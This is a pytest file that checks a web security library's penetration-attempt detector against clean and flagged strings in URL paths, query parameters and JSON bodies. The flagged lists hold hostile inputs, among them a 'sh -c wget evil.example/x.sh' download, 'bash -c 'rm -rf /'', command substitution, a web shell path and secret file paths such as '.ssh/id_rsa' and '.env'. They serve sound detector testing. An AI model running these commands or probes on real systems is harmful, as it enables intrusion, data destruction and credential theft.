import json

import pytest

from guard_core.models import SecurityConfig
from guard_core.sync.utils import detect_penetration_attempt
from tests.test_sync.conftest import SyncMockGuardRequest


def _flagged(value: str, surface: str) -> bool:
    if surface == "path":
        request = SyncMockGuardRequest(path=value)
    elif surface == "query":
        request = SyncMockGuardRequest(path="/s", query_params={"q": value})
    else:
        raw = ('{"note": ' + json.dumps(value) + "}").encode()
        request = SyncMockGuardRequest(
            method="POST",
            path="/s",
            headers={
                "content-type": "application/json",
                "content-length": str(len(raw)),
            },
            body_content=raw,
        )
    result = detect_penetration_attempt(request, SecurityConfig(enable_redis=False))
    return result.is_threat


URL_PATH_CLEAN = [
    "The `<script>` tag loads external JavaScript resources.",
    "Please review `README.md` before opening a PR.",
    "Run `ls` to list files in the directory.",
    "Try `curl -X GET` against the users endpoint.",
    "const url = `https://api.example.com/users/${userId}`;",
    "Run `SELECT id FROM users` in the console to verify the migration.",
    "sh -c 'npm start'",
    "/usr/bin/env bash -c 'echo hi'",
]
# D-70 and D-143: a URL path holding sh -c with a known command is flagged whatever words follow
URL_PATH_FLAGGED = [
    "First run setup; sh -c 'ls' to verify.",
    "ticket note: reproduced by running commands; /bin/sh -c whoami showed root",
    "sh -c id and then some words",
    "sh -c wget evil.example/x.sh to update",
    "sh%20-c%20id%20please",
    "`whoami`",
    "`id`",
    "sh -c id",
    "/bin/sh -c id",
    "env bash -c id",
    "bash -c 'rm -rf /'",
    "; bash -c id",
    "; /usr/bin/env sh -c id",
    'eval("require(1)")',
    "/inicio.html",
    "/wp-content/uploads/2024/shell.php",
    "/wp-content/uploads/",
]
VALUE_CLEAN = [
    "/var/www/html/index.html",
    "/var/www/html/css/site.css",
    "C:\\Users\\alice\\Documents\\report.docx",
]
VALUE_FLAGGED = [
    "/var/www/app/main.go",
    "/var/www/html/shell.php",
    "/var/www/html/.env",
    "C:\\Windows\\win.ini",
    "D:\\data\\export.txt",
    "C:\\Users\\alice\\.ssh\\id_rsa",
    "/en/inicio.html",
    "/wp-content/uploads/2024/shell.php",
]


@pytest.mark.parametrize("value", URL_PATH_CLEAN)
def test_documentation_and_ordinary_shell_mentions_in_a_url_path_are_clean(
    value: str,
) -> None:
    assert not _flagged(value, "path")


@pytest.mark.parametrize("value", URL_PATH_FLAGGED)
def test_command_substitution_dash_c_and_probe_shapes_in_a_url_path_stay_flagged(
    value: str,
) -> None:
    assert _flagged(value, "path")


@pytest.mark.parametrize("surface", ["query", "body"])
@pytest.mark.parametrize("value", VALUE_CLEAN)
def test_a_web_asset_and_a_user_document_path_value_is_clean(
    value: str, surface: str
) -> None:
    assert not _flagged(value, surface)


@pytest.mark.parametrize("surface", ["query", "body"])
@pytest.mark.parametrize("value", VALUE_FLAGGED)
def test_system_source_and_secret_path_values_stay_flagged(
    value: str, surface: str
) -> None:
    assert _flagged(value, surface)
